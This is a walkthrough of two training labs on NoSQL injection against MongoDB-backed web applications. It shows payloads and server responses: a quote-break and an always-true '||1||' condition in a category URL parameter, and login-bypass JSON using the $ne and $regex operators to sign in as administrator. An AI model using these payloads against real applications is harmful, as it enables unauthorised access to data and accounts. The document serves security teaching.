
# Lab 1

## Description

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

## Solution

Heading to:

```
/filter?category=Accessories
```

and tempering with the `category` parameter as follows:

```
/filter?category=Accessories'
```

shows:

```
[...]
Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
[...]
```

Now trying:

```
Accessories'%2b' - URL-encode space to %2b, + throws a 500 error 
```

returns 200 OK and lists products from the `Accessories` category. 

Now testing with boolean operators (&&, || - and, or) with a condition that always returns true (equivalent to `or 1=1` in SQL):

```
/filter?category=Accessories%27||1||%27
```

This returns all the products. To solve the lab make this request in browser for javascript to execute.


# Lab 2

## Description

The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the `administrator` user.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

Going through the login  process with given creds:

```
[...]
{"username":"wiener","password":"peter"}
```

and returns:

```
302 Found
```

on successful login.

Now trying:

```
[...]
{"username":{"$ne": ""},"password":"peter"}
```

Is successful as well (because $ne - return all usernames that are not "" with "peter" as password).

Now testing regex:

```
[...]
{"username":{"$regex": "wien.*"},"password":"peter"}
```

Also works. The task is to login to the administrator account, so using:

```
[...]
{"username":{"$regex": "ad.*"},"password":{"$ne":""}}
```

is successful.

Showing request in browser solves the challenge.




